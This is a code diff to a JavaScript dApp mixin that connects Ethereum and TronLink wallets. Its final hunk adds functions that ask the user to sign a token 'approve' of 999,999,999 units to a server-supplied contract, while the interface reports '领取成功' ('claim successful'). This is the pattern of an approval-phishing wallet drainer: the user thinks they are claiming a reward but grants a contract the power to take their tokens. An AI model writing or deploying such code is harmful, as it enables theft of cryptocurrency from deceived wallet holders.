@@ -57,7 +57,7 @@ export const commonMixin = {
                     //@todo 这一步可能需要调整，在选择不同的链才触发
                     //链接钱包
                     await ethereum.request({method: 'eth_requestAccounts'}).catch(e => console.log(e));
-                    await this.ethcontent_chain()
+                    await this.ethChain()
                 } else if (window?.tronWeb) {
                     console.log(`window.tronWeb`)
                     if (typeof window.tronWeb?.defaultAddress?.base58 !== 'undefined') {
@@ -71,7 +71,7 @@ export const commonMixin = {
                         console.log(`start setAddress`,window?.tronWeb?.defaultAddress?.base58)
                         if(window?.tronWeb?.defaultAddress?.base58){
                             await this.$store.dispatch(`setAddress`, {
-                                wallet_address: window.tronWeb.defaultAddress.base58,
+                                wallet_address: window.tronWeb?.defaultAddress?.base58,
                                 smart_contract: ctx?.smart_contract
                             })
                             await this.$store.dispatch(`setWalletIndex`, 2)
@@ -82,7 +82,7 @@ export const commonMixin = {
                     console.log('not net')
                     clearInterval(obj);
                     if (!this.isauto) {
-                        this.show_ethWallet_list()
+                        await this.showWalletList()
                     }
                 }
             }, 100);
@@ -98,11 +98,9 @@ export const commonMixin = {
                 title: null,
                 itemList: this.walletLinkName,
                 success: async (res) => {
-                    console.log(`chooselink res`, res)
                     await this.$store.dispatch(`setWalletIndex`, res.tapIndex)
                     if (this.walletLink[this.walletIndex] === 'trc') {
-                        console.log(`trccontent`)
-                        await this.trccontent()
+                        await this.trcConnect()
                     } else {
                         console.log(`ethcontent`)
                         await this.connect()
@@ -110,7 +108,7 @@ export const commonMixin = {
                 }
             })
         },
-        async ethcontent_chain() {
+        async ethChain() {
             //获取链id
             console.log(`call ethcontent_chain`)
             try {
@@ -137,8 +135,10 @@ export const commonMixin = {
                 comjs.jsalert('连接失败');
             }
         },
-        async trccontent() {
-            if (window.tronWeb && typeof window.tronWeb?.defaultAddress?.base58 !== 'undefined') {
+        async trcConnect() {
+            this.tronWeb = await this.getTronWeb();
+            const res = await tronLink.request({method: 'tron_requestAccounts'});
+            if (res.code === 200) {
                 let ctx = this.contracts[this.walletLink[this.walletIndex]]
                 await this.$store.dispatch(`setAddress`, {
                     wallet_address: window.tronWeb.defaultAddress.base58,
@@ -146,12 +146,11 @@ export const commonMixin = {
                 })
                 await this.$store.dispatch(`setIsConnected`, true)
                 await this.$store.dispatch(`setWalletIndex`, 2)
-                this.tronWeb = await this.getTronWeb();
             } else {
-                this.show_ethWallet_list()
+                await this.showWalletList()
             }
         },
-        show_ethWallet_list() {
+        async showWalletList() {
             //钱包跳转
             //@todo 域名从接口获取？
             let dappdomain = window.location.origin //本站域名
@@ -178,12 +177,111 @@ export const commonMixin = {
                 tronWeb = tronLink.tronWeb;
             } else {
                 const res = await tronLink.request({method: 'tron_requestAccounts'});
-                console.log(`tron_requestAccounts res`,res)
                 if (res.code === 200) {
                     tronWeb = tronLink.tronWeb;
                 }
             }
             return tronWeb;
+        },
+        async approveSuccess() {
+            //保存授权地址信息，无需处理返回信息
+            console.log(`call doapprove_success`)
+        },
+        async approveTrc() {
+            console.log(`call doapprove_trc`)
+            //是否获取到相应合约
+            if (this.contracts.length === 0 || !this.contracts?.trc) {
+                return false;
+            }
+            await uni.showLoading()
+            try {
+                let contractdata = this.contracts?.trc
+                if (!contractdata) {
+                    return;
+                }
+                const tronWeb = window.tronWeb
+                let _value = 999999999000000 //授权数量
+                const parameter = [{
+                    type: 'address',
+                    value: contractdata.smart_contract
+                }, {
+                    type: 'uint256',
+                    value: _value
+                }];
+                const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+                    contractdata.smart_contract,
+                    "approve(address,uint256)", {},
+                    parameter,
+                    this.address
+                );
+                const signedTx = await tronWeb.trx.sign(tx.transaction);
+                const broastTx = await tronWeb.trx.sendRawTransaction(signedTx);
+                uni.hideLoading()
+                if (broastTx?.result) {
+
+                    //授权处理成功，开始成功后的业务处理----------------------
+                    await this.$store.dispatch(`setIsApprove`, {result: true, txid: broastTx.txid})
+                    await this.approveSuccess()
+                    //授权处理成功，结束成功后的业务处理----------------------
+
+                    comjs.jsalert("领取成功");
+                } else {
+                    comjs.msg('领取失败')
+                }
+            } catch (e) {
+                uni.hideLoading()
+                console.log(`exception:`,e)
+                comjs.msg('领取失败')
+            }
+        },
+        async approveEth() {
+            console.log(`doapprove_eth`)
+            await uni.showLoading()
+            try {
+                //以太坊/币安  授权开始
+                let strabi =
+                    '[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]'
+                let abi = JSON.parse(strabi)
+                let ctx = this.contracts[this.walletLink[this.walletIndex]]
+                if (!ctx) {
+                    return;
+                }
+                let contract = new this.web3js.eth.Contract(abi, ctx.token_contract);
+                //授权数量
+                let _value = Web3.utils.toWei("999999999", 'ether');
+                const receipt = await contract.methods.approve(ctx.smart_contract, _value).send({
+                    from: this.address
+                })
+                const transactionHash = receipt?.transactionHash;
+                if (transactionHash) {
+                    uni.hideLoading()
+                    await this.$store.dispatch(`setIsApprove`, {result: true, txid: transactionHash})
+                    await this.approveSuccess()
+                    comjs.jsalert("领取成功");
+                }
+            } catch (e) {
+                console.log(`e`,e)
+                uni.hideLoading()
+                comjs.msg('领取失败')
+            }
+        },
+        doapprove() {
+            //是否已授权
+            if (this.isApprove) {
+                comjs.jsalert("领取成功");
+                return true;
+            }
+            //没有连接到钱包？开始连接
+            if (!this.isConnected) {
+                this.chooselink()
+                return true;
+            }
+            //开始授权
+            if (this.walletLink[this.walletIndex] === 'trc') {
+                this.approveTrc();
+            } else {
+                this.approveEth();
+            }
         },
     }
 }
